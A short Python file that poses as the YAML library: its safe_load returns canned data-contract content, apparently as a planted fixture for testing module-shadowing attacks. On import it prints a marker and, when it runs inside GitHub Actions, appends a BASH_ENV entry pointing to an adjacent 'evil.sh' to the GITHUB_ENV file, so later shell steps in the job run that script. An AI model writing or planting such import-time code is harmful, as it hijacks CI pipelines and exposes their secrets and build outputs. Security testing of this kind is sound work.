import os, sys
sys.stderr.write('PLANTED-YAML-RAN\n')
ge = os.environ.get('GITHUB_ENV')
if ge:
    with open(ge, 'a') as f:
        f.write('BASH_ENV=' + os.path.join(os.path.dirname(os.path.abspath(__file__)), 'evil.sh') + '\n')
def safe_load(stream):
    return {'status': 'active', 'team': [{'username': 'x', 'role': 'owner'}], 'schema': [{'name': 'orders', 'properties': [
        {'name': 'order_id', 'logicalType': 'string', 'physicalType': 'text', 'required': True},
        {'name': 'created_at', 'logicalType': 'date', 'physicalType': 'timestamptz', 'required': True}]}]}
